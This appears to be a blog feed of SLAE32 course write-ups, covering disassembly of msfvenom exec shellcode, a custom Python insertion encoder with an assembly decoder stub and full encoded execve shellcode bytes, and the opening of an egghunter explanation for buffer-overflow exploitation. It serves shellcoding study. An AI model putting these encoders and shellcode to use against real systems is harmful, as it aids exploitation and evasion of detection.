&lt;h3 id=&quot;-part-3---linuxx86exec-shellcode-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Part 3 - linux/x86/exec shellcode &lt;/span&gt;&lt;/h3&gt;

&lt;h4 id=&quot;-principle--2&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt; Principle &lt;/span&gt;&lt;/h4&gt;

&lt;p&gt;This linux/x86/exec shellcode execute an arbirary command line.&lt;/p&gt;

&lt;p&gt;To find out how the shellcode works and reacts we first performed a test with the following the steps:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.21.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, an ls command as been specified to the shellcode and successfully executed when launch.&lt;/p&gt;

&lt;p&gt;Now we are will go deeper and find out which syscalls are performed.&lt;/p&gt;

&lt;h4 id=&quot;-shellcode-analysis-&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt; Shellcode Analysis &lt;/span&gt;&lt;/h4&gt;

&lt;p&gt;To analyse this shellcode we can use several technics.
First, we can use directly GDB to go step by step an stop at each syscall and looking at the register’s values.&lt;/p&gt;

&lt;p&gt;We can used as well the libemu/tools/sctest script to analyse it :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x86/exec CMD=ls R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000
    -S : read shellcode from stdin
    -s : how much of the shellcode we would like to run (100000 =&amp;gt; to have all the shellcode executed)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And used the graphical option to help to visualize it :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x86/exec CMD=ls R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000 -G exec.dot
//Then convert into PNG file :
dot exec.dot -Tpng -o exec.png
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Result:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.22.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, we can display the instruction with the following command line:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x86/exec CMD=ls R | ndisasm -u -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this assessment, we will use all of those technic to be more specific about the actions performed.&lt;/p&gt;

&lt;p&gt;Shellcode instructions:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x8048054:	push   0xb
0x8048056:	pop    eax
0x8048057:	cdq    
0x8048058:	push   edx
0x8048059:	pushw  0x632d
0x804805d:	mov    edi,esp
0x804805f:	push   0x68732f
0x8048064:	push   0x6e69622f
0x8048069:	mov    ebx,esp
0x804806b:	push   edx
0x804806c:	call   0x8048074
0x8048071:	ins    BYTE PTR es:[edi],dx
0x8048072:	jae    0x8048074
0x8048074:	push   edi
0x8048075:	push   ebx
0x8048076:	mov    ecx,esp
0x8048078:	int    0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first two instructions set the value of eax to 0xb.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x8048054:	push   0xb
0x8048056:	pop    eax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;0xb in hexadecimal is equivalent to 11 in decimal.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/exec# printf &quot;%d\n&quot; 0xb
11
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We search what syscall corresponds to the decimal value 11 in the unistd_32.h file and it appears that it is the execve syscall.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/exec# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 11
#define __NR_execve 11
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Details of the execve syscall:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;execve - execute program
int execve(const char *pathname, char *const argv[], char *const envp[]);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, the arguments of the exceve syscall as follows needs to be defined:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Pathname: Pointer pointing to the string of the path to the executable;&lt;/li&gt;
  &lt;li&gt;Argv[]: Array of pointers pointing to the command-line strings;&lt;/li&gt;
  &lt;li&gt;envp[]: Array of pointers pointing to the environment strings of the new program (usually NULL).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The next instructions are:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x8048058:	push   edx
0x8048059:	pushw  0x632d
0x804805d:	mov    edi,esp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It set the value 0x632d to the registers EDI.&lt;/p&gt;

&lt;p&gt;We mapped the value 0x632d to the ASCII table and inversed the value because of the little indian indentation and we find out that the EDI register is set to “-c”.&lt;/p&gt;

&lt;p&gt;Then, two pushs are performed on the stack and the address is then set to the register EBX.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x804805f:	push   0x68732f =&amp;gt; /sh
0x8048064:	push   0x6e69622f =&amp;gt; /bin
0x8048069:	mov    ebx,esp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, we mapped the values to the ASCII table and inversed the values because of the little indian indentation and we deducted that the address of the string “/bin/sh” has been set into the EBX register.&lt;/p&gt;

&lt;p&gt;Then, the following instruction are used to retrieve the command line that we want to launch.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x804806b:	push   edx
0x804806c:	call   0x8048074
0x8048071:	ins    BYTE PTR es:[edi],dx
0x8048072:	jae    0x8048074
0x8048074:	push   edi
0x8048075:	push   ebx
0x8048076:	mov    ecx,esp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The call instruction performed put on the stack the address of the ls string, then the edi’s value “-c” is pushed on the stack as well as the /bin/sh and finally the ESP address containing the argument “/bin/sh -c ls” is pushed into the ECX register.&lt;/p&gt;

&lt;p&gt;To conclude, as follows the state of the Execve syscall:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.24.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;

&lt;p&gt;SO, we can see that:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The EAX register contains the decimal value 11 related to the Execve syscall;&lt;/li&gt;
  &lt;li&gt;The EBX register contains the address of the string pathname /bin/sh;&lt;/li&gt;
  &lt;li&gt;The ECX register contains the arguments “/bin/sh -c ls”;&lt;/li&gt;
  &lt;li&gt;The EDX value is set to NULL.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;And, when the syscall is performed, the “ls” command line is executed:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.25.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="SLAE32" /><summary type="html">Description of the assignment Take up at least 3 shellcode samples created using Msfpayload for linux/x86 Use GDB/NDisasm/Libemu to dissect the functionality of the shellcode Present your analysis We are going to analyse together the following shellcodes: linux/x86/adduser linux/x86/exec linux/x86/meterpreter/reverse_tcp -TO SUPP linux/x86/chmod</summary></entry><entry><title type="html">SLAE32</title><link href="http://localhost:4000/slae32/2022/10/04/Assign4-encoder.html" rel="alternate" type="text/html" title="SLAE32" /><published>2022-10-04T08:45:58+02:00</published><updated>2022-10-04T08:45:58+02:00</updated><id>http://localhost:4000/slae32/2022/10/04/Assign4-encoder</id><content type="html" xml:base="http://localhost:4000/slae32/2022/10/04/Assign4-encoder.html">&lt;h3 id=&quot;-description-of-the-assignment-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Description of the assignment &lt;/span&gt;&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Create a custom encoding scheme like the “Insertion Encoder” we showed you;&lt;/li&gt;
  &lt;li&gt;PoC with using execve-stack as the shellcode to encode with your schema and execute.&lt;/li&gt;
&lt;/ul&gt;

&lt;!--more--&gt;

&lt;h3 id=&quot;-principal-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Principal &lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;In this assignment, we will create a custom Incremental Insertion Encoder.&lt;/p&gt;

&lt;p&gt;Here an exemple of how the encoder will works :&lt;/p&gt;

&lt;p&gt;Original shellcode :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x1,0x2,0x3,0x4,0x5,0x6,0x7,0x8,0x9,0x10
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Encoded shellcode :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x1,0xAA,0x2,0x3,0xAA,0xAA,0x4,0x5,0x6,0xAA,0xAA,0xAA,0x7,0x8,0x9,0x10,0xbb,0xbb,0xbb,0xbb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;-encoder-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Encoder &lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;In this section, you will find a python script which will encode the source shellcode in the right format.&lt;/p&gt;

&lt;p&gt;The structure of the code is as follows :&lt;/p&gt;

&lt;p&gt;1) It retrieves the size of the shellcode and compute how many set of the data there will be, the size of the last set and deducts with those information the number of values remaining in the last set.&lt;/p&gt;

&lt;p&gt;2) Then, it builds our encoded shellcode by retrieving set by set the values from our shellcode until the ultimate set.&lt;/p&gt;

&lt;p&gt;3) Because the last set might not be completely fulfilled, it will only retrieve from the shellcode the number of values that remains.&lt;/p&gt;

&lt;p&gt;4) It inserts the EGG at the end of the shellcode.&lt;/p&gt;

&lt;p&gt;5) And finally, it prints our encoded shellcode.&lt;/p&gt;

&lt;h4 id=&quot;result&quot;&gt;Result:&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment4/inc-ins.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;code&quot;&gt;Code&lt;/h4&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#!/usr/bin/python

import sys

input = sys.argv[1] 

print &apos;String length : &apos;+ str(len(input))

### Initialization of the Lists
# Retrieve the shellcode and insert it into a list
stringList = [input[i:i+4] for i in range(0, len(input), 4)]
# Empty list for our encoded shellcode
stringListEncoded = []


### First part to compute the number of set, the size of the last set and the number of value in the last set
#Counters
nbSet = 0
length = len(stringList)
valPos = 1
lengthSet = 1

print &quot;length&quot; + str(length)

# Compute how many set of data there will be.
while valPos &amp;lt;= length:
    valPos = valPos + lengthSet  
    lengthSet = lengthSet + 1
    nbSet = nbSet + 1

# Compute how many value are in the last set
l = valPos - lengthSet
supplIt = length - (valPos - lengthSet)
print(supplIt) #nb iterations supplementaires


### Second part, build the encoded shellcode   
# Counters
nbInsertion = 1
posValue = 0
nbValueToMove = 1
savedPosValue = 0

# Iteration until nbSet-1 
while nbInsertion &amp;lt;= (nbSet - 1): 
    nbVal = 0
    while nbVal &amp;lt; nbInsertion : # nb value to move = nb insertion
        val = &apos;0x%02s&apos; % stringList[posValue + nbVal][2:]
        stringListEncoded.append(val) # Insert the value in the list for the encoded shellcode     
        nbVal = nbVal + 1

    # Encoding insertion 0xaa
    nbEncode = 0
    while nbEncode &amp;lt; nbInsertion:
        encoder =  &apos;0x%02x&apos; % 0xaa
        stringListEncoded.append(encoder) #insert
        nbEncode = nbEncode + 1
    
    # Increment counters
    savedPosValue = posValue
    posValue = posValue + nbInsertion 
    nbInsertion = nbInsertion + 1
    
# Last iteration
it = 0
while it &amp;lt; supplIt:
    val = &apos;0x%02s&apos; % stringList[posValue+it][2:]
    stringListEncoded.append(val) #insert 
    it = it + 1


# Insertion of the Egg at the end
for i in range(4):
    encoder = &apos;0x%02x&apos; % 0xbb
    stringListEncoded.append(encoder) #insert 

# Convert the list into the good format and display the result
finalvalue = &quot;&quot;
for val in stringListEncoded:
    finalvalue = finalvalue + str(val) + &apos;,&apos;

print finalvalue
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;-decoder-shellcode-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Decoder shellcode &lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;Now that we have our encoded shellcode, we will have to create our assembly code which go throught our encoded shellcode, retrieves the interesting part, replace them in the desired position and when finally the “Egg” is found, execute it.&lt;/p&gt;

&lt;p&gt;First, we used the JMP-CALL-POP technic to retrieve the address of our encoded shellcode and stored it in ESI.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;_start:
    jmp short calldecoder ; jump to the calldecoder section
.....
...
..
decoder : 
    pop esi ; retrieve the address of the EncodedShellcode	
    .....
    ...
    ..
calldecoder : 
    call decoder
    EncodedShellcode : db 0x1,0xAA,0x2,0x3,0xAA,0xAA,0x4,0x5,0x6,0xAA,0xAA,0xAA,0x7,0x8,0x9,0x10,0xbb,0xbb,0xbb,0xbb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, we initialized our counters and registers.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Initialization of our counter EDX to 1 :&lt;/p&gt;

    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  mov dl, 0x1 ; Initialize the counter to 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Initialization of the EBX register which represent the number of shift from the ESI register to point to the first value of the set of value that we want to retrieve :&lt;/p&gt;

    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  xor ebx, ebx 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Initialization of the EDI register which point to the address where we want to write&lt;/p&gt;

    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  mov edi, esi 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The next step is to create our function which will go from on set of values to the next one and check that we didn’t arrive at the end of our shellcode.&lt;/p&gt;

&lt;p&gt;To check if we arrived at the end of our shellcode, we inserted an Egg “0xbbbbbbbb” at the end of it, so that we only need to check if the next 4 bytes match with our egg. And in case of a match, we jump to our shellcode to execute it.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nextSetValues : 
    cmp dword [esi + ebx + 0x4], 0xbbbbbbbb
    je EncodedShellcode
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the situation that we didn’t find our egg, we search for the place to write by adding the value of the counter EDX to the EDI register.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;lea edi, [edi + edx]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once we find where we want to write, we need to locate the set of value that we want to retrieve. To find them, we use the arithmetic computation “EBX = EBX + 2*EDX”.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mov al, 2 ; Intialize the value of eax to 2	
mul dl	; Multiply EAX with EDX (2*edx)
add eax, ebx  ; Add EBX to EAX (EAX = EBX + 2*EDX)
mov ebx, eax ; mov into EBX the valu of EAX
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can notice that the counter’s value is equal to the number of value that we need to copy :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Counter EDX = 1, number of value to copy is 1&lt;/li&gt;
  &lt;li&gt;Counter EDX = 2, number of value to copy is 2&lt;/li&gt;
  &lt;li&gt;etc…&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So we need to create a function which has another counter (ECX) that copy each value in the set of value that we need to retrieve (ESI + EBX + ECX) into the proper location (EDI + ECX) until that counter is less or equal to the counter EDX.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    xor ecx, ecx 			; Init the counter to zero

nextValues :
    pusha ; Save registers state
    ; Find the location where we want to write the value
    xor eax, eax
    lea eax, [edi + ecx]                ; Value at EDI + ECX

    ;Find the value that we want to retrieve and copy in the location previously found
    add ebx, ecx                        ; EBX + ECX
    lea edx, [esi + ebx]                ; lea edx, [esi + ebx + ecx]
    mov bl, byte [edx] 			; mov the value into bl
    mov byte [eax], bl 			; mov the value we temporary stored at bl into al

    popa				; Restore the registers
    
    inc ecx			        ; Increment the counter to go to the next value of the set
    cmp ecx, edx		        ; Compare EDX and ECX		
    jle short nextValues                ; If the same value, no more value to move
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, if the counter ECX is greater than EDX, we need to go to the next set of value.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;inc edx					; Increment the counter
jmp short nextSetValues			; Go to the next set of value to retrieve
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this assessment, we used the JMP-CALL-POP Execve shellcode from the exercise as follows :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, we used the python encoded (see picture section Encoder) to encoded it.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x31,0xaa,0xc0,0x50,0xaa,0xaa,0x68,0x62,0x61,0xaa,0xaa,0xaa,0x73,0x68,0x68,0x62,0xaa,0xaa,0xaa,0xaa,0x69,0x6e,0x2f,0x68,0x2f,0xaa,0xaa,0xaa,0xaa,0xaa,0x2f,0x2f,0x2f,0x89,0xe3,0x50,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xcd,0x80,0xbb,0xbb,0xbb,0xbb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally we compile our shellcode by doing the following steps :&lt;/p&gt;

&lt;p&gt;First, we compiled our assembly code :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nasm -f elf -o ExecEncodedShellcode.o ExecEncodedShellcode.nasm
ld -m elf_i386 ExecEncodedShellcode.o -o ExecEncodedShellcode
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, we used the objdump tool to retrieve our shellcode intructions :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;objdump -d ExecEncodedShellcode|grep &apos;[0-9a-f]:&apos;|sed -n &apos;1!p&apos;|grep -v &apos;file&apos;|cut -f2 -d:|cut -f1-7 -d&apos; &apos;|tr -s &apos; &apos;|tr &apos;\t&apos; &apos; &apos;|sed &apos;s/ $//g&apos;|sed &apos;s/ /\\x/g&apos;|paste -d &apos;&apos; -s |sed &apos;s/^/&quot;/&apos;|sed &apos;s/$/&quot;/g&apos;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Which gave the following result:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;\xeb\x3f\x31\xf6\x5e\x31\xd2\xb2\x01\x31\xdb\x31\xff\x89\xf7\x31\xc0\x31\xc9\x8d\x3c\x17\xb0\x02\xf6\xe2\x01\xd8\x89\xc3\x31\xc9\x60\x31\xc0\x8d\x04\x0f\x01\xcb\x81\x3c\x1e\xbb\xbb\xbb\xbb\x74\x15\x8d\x14\x1e\x8a\x1a\x88\x18\x61\x41\x39\xd1\x7e\xe2\x42\xeb\xd2\xe8\xbc\xff\xff\xff\x31\xaa\xc0\x50\xaa\xaa\x68\x62\x61\xaa\xaa\xaa\x73\x68\x68\x62\xaa\xaa\xaa\xaa\x69\x6e\x2f\x68\x2f\xaa\xaa\xaa\xaa\xaa\x2f\x2f\x2f\x89\xe3\x50\xaa\xaa\xaa\xaa\xaa\xaa\x89\xe2\x53\x89\xe1\xb0\x0b\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xcd\x80\xbb\xbb\xbb\xbb&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And finally we insert the shellcode in our C file, compiled it and launched it :&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment4/final.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px;&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="SLAE32" /><summary type="html">Description of the assignment Create a custom encoding scheme like the “Insertion Encoder” we showed you; PoC with using execve-stack as the shellcode to encode with your schema and execute.</summary></entry><entry><title type="html">SLAE32</title><link href="http://localhost:4000/slae32/2022/10/01/Assign3-EggHunter.html" rel="alternate" type="text/html" title="SLAE32" /><published>2022-10-01T08:45:58+02:00</published><updated>2022-10-01T08:45:58+02:00</updated><id>http://localhost:4000/slae32/2022/10/01/Assign3-EggHunter</id><content type="html" xml:base="http://localhost:4000/slae32/2022/10/01/Assign3-EggHunter.html">&lt;h3 id=&quot;-description-of-the-assignment-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Description of the assignment &lt;/span&gt;&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Study about the EggHunter shellcode;&lt;/li&gt;
  &lt;li&gt;Create a working demo of the EggHunter;&lt;/li&gt;
  &lt;li&gt;Should be configurable for different payload.&lt;/li&gt;
&lt;/ul&gt;

&lt;!--more--&gt;

&lt;h3 id=&quot;-principal---what-is-an-egghunter--&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Principal - What is an EggHunter ? &lt;/span&gt;&lt;/h3&gt;

&lt;p&gt;The EggHunter is method used to exploit a buffer overflow vulnerability when the amount of space which could be allocated is not large enought to perform the simple buffer overflow technic by injecting directly the shellcode. Its particularity is that it is a small piece a instruction which will search into the memory for a known pattern that we were able to put somewhere into the memory (for instance in a HTML file) and execute its instructions.&lt;/p&gt;

&lt;p&gt;There are few conditions that an egghunter should answer :&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;It must be robust : Capable of searching anywhere into the memory and do not crash when it goes through invalids memory regions.&lt;/li&gt;
  &lt;li&gt;It must be small : The main requirement of the EggHunter is that it should be small enough to fit where no other payload would be able
to fit. The smaller the better.&lt;/li&gt;
  &lt;li&gt;And it must be fast : The searching of the known pattern should be performed as quick as possible without having to wait a long time at each exploitation.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;-description-of-the-exploitation-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Description of the exploitation &lt;/span&gt;&lt;/h3&gt;

&lt;h4 id=&quot;egg-definition&quot;&gt;Egg definition&lt;/h4&gt;

&lt;p&gt;The first things to do is to define the “egg” to searh for into the memory and that will inform our EggHunter that it founds the instruction to execute.
In this exercise, for this egg, we will use the 8 bytes as follows :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000000 90       nop 
00000001 50       push eax 
00000002 90       nop 
00000003 50       push eax 
00000004 90       nop 
00000005 50       push eax 
00000006 90       nop 
00000007 50       push eax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As a raw buffer, the key becomes a dword 0x50905090 repeated twice in a row. There are 3 reason why we choosed that payload :&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;With two repeated key, it doesn’t have to search for two unique keys one after the other but only to search for one repeated twice ;&lt;/li&gt;
  &lt;li&gt;The 8 bytes length allows to have enought uniqueness;&lt;/li&gt;
  &lt;li&gt;And its instructions allowed the shellcode to be directly executed without having to add more instruction to jump those 8 bytes.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The instruction in our code will be :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mov edi, 0x50905090
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;egghunter-definition&quot;&gt;EggHunter definition&lt;/h4&gt;

&lt;p&gt;In this paper, we will use the “access” syscall which checks whether the calling process can access a file at a specific pathname.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int access (const char *pathname, int mode);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The pointer in parameter “*pathname” will allow us to access to the memory value of the pointed address. And the return value of this function “EFAULT”, will inform us that the pathname points outside an accessible address space.&lt;/p&gt;

&lt;p&gt;The decimal value of the access call is 33 as we can see :&lt;/p&gt;

